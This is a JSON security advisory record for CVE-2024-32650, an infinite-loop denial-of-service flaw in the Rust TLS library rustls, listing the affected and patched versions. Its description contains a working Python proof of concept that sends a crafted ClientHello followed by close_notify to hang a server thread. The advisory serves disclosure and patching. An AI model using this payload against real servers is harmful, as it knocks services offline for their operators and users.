{
  "Severity": "HIGH",
  "UpdatedAt": "2024-04-19T19:46:58Z",
  "Package": {
    "Ecosystem": "RUST",
    "Name": "rustls"
  },
  "Advisory": {
    "DatabaseId": 242543,
    "Id": "GSA_kwCzR0hTQS02Zzd3LTh3cHAtZnJoas4AA7Nv",
    "GhsaId": "GHSA-6g7w-8wpp-frhj",
    "References": [
      {
        "Url": "https://github.com/rustls/rustls/security/advisories/GHSA-6g7w-8wpp-frhj"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2024-32650"
      },
      {
        "Url": "https://github.com/rustls/rustls/commit/2123576840aa31043a31b0770e6572136fbe0c2d"
      },
      {
        "Url": "https://github.com/rustls/rustls/commit/5374108df698e78c3e9ef8265cac311556be24af"
      },
      {
        "Url": "https://github.com/rustls/rustls/commit/6e938bcfe82a9da7a2e1cbf10b928c7eca26426e"
      },
      {
        "Url": "https://github.com/rustls/rustls/commit/ebcb4782f23b4edf9b10a7065d9e8d4362439d9c"
      },
      {
        "Url": "https://github.com/rustls/rustls/commit/f45664fbded03d833dffd806503d3c8becd1b71e"
      },
      {
        "Url": "https://rustsec.org/advisories/RUSTSEC-2024-0336.html"
      },
      {
        "Url": "https://github.com/advisories/GHSA-6g7w-8wpp-frhj"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-6g7w-8wpp-frhj"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2024-32650"
      }
    ],
    "Description": "### Summary\n`rustls::ConnectionCommon::complete_io` could fall into an infinite loop based on network input.\n\n### Details\n\nVerified at `0.22` and `0.23` `rustls`, but `0.21` and `0.20` release lines are also affected. `tokio-rustls` and `rustls-ffi` do not call `complete_io` and are not affected. `rustls::Stream` and `rustls::StreamOwned` types use `complete_io` and are affected.\n\nWhen using a blocking rustls server, if a client send a `close_notify` message immediately after `client_hello`, the server's `complete_io` will get in an infinite loop where:\n\n- `eof`: false\n- `until_handshaked`: true\n- `self.is_handshaking()`: true\n- `self.wants_write()`: false\n- `self.wants_read()`: false\n\n\n### PoC\n\n1. Run simple server: `cargo run --bin simpleserver test-ca/rsa/end.fullchain test-ca/rsa/end.key`\n2. Run following python script\n    ```python3\n    #!/usr/bin/env python3\n    \n    import socket\n    \n    sock = socket.socket()\n    sock.connect((\"localhost\", 4443))\n    \n    print(\"Sending client hello...\")\n    \n    # Fake handshake data of a client hello message.\n    fake_handshake = \"\"\"\n    1603 0100 c801 0000 c403 03ec 12dd\n    1764 a439 fd7e 8c85 46b8 4d1e a06e b3d7\n    a051 f03c b817 470d 4c54 c5df 7200 001c\n    eaea c02b c02f c02c c030 cca9 cca8 c013\n    c014 009c 009d 002f 0035 000a 0100 007f\n    dada 0000 ff01 0001 0000 0000 1600 1400\n    0011 7777 772e 7769 6b69 7065 6469 612e\n    6f72 6700 1700 0000 2300 0000 0d00 1400\n    1204 0308 0404 0105 0308 0505 0108 0606\n    0102 0100 0500 0501 0000 0000 0012 0000\n    0010 000e 000c 0268 3208 6874 7470 2f31\n    2e31 7550 0000 000b 0002 0100 000a 000a\n    0008 1a1a 001d 0017 0018 1a1a 0001 00\n    \"\"\"\n    \n    \n    def parse_fake_handshake():\n        i = 0\n        data = bytearray()\n        while i \u003c len(fake_handshake):\n            while i \u003c len(fake_handshake) and fake_handshake[i].isspace():\n                i += 1\n            if i \u003e= len(fake_handshake):\n                return data\n    \n            c1 = fake_handshake[i]\n            c2 = fake_handshake[i + 1]\n            i += 2\n    \n            data.append(int(c1, 16) * 16 + int(c2, 16))\n        return data\n    \n    \n    data = parse_fake_handshake()\n    \n    print(\"Fake client hello:\", data)\n    \n    sock.send(data)\n    \n    # Send close_notify alert that we're closing the connection.\n    close_data = bytearray([0x15, 0x03, 0x03, 0x00, 0x02, 0x01, 0x00])\n    print(f\"close_notify is {close_data}\")\n    sock.send(close_data)\n    print(\"close_notify sent\")\n    \n    exit(0)\n    ```\n4. You could observe the server process get into 100% cpu usage, and if you add logging at beginning of `rustls::conn::ConnectionCommon::complete_io`, you could see the function is spinning.\n\nAlso note that the server thread is stuck in this infinite loop even if the client closes the socket.\n\n### Impact\n\nThis is a DOS.\n\nA multithread non-async server that uses `rustls` could be attacked by getting few requests like above (each request could cause one thread to spin) and stop handling normal requests.\n",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2024-04-19T19:46:57Z",
    "Severity": "HIGH",
    "Summary": "Denial of Service Vulnerability in Rustls Library",
    "UpdatedAt": "2024-05-21T17:23:34Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 7.5,
      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": ""
      },
      "VulnerableVersionRange": "= 0.20"
    },
    {
      "FirstPatchedVersion": {
        "Identifier": "0.21.11"
      },
      "VulnerableVersionRange": "\u003e= 0.21.0, \u003c= 0.21.10"
    },
    {
      "FirstPatchedVersion": {
        "Identifier": "0.22.4"
      },
      "VulnerableVersionRange": "\u003e= 0.22.0, \u003c= 0.22.3"
    },
    {
      "FirstPatchedVersion": {
        "Identifier": "0.23.5"
      },
      "VulnerableVersionRange": "\u003e= 0.23.0, \u003c= 0.23.4"
    }
  ]
}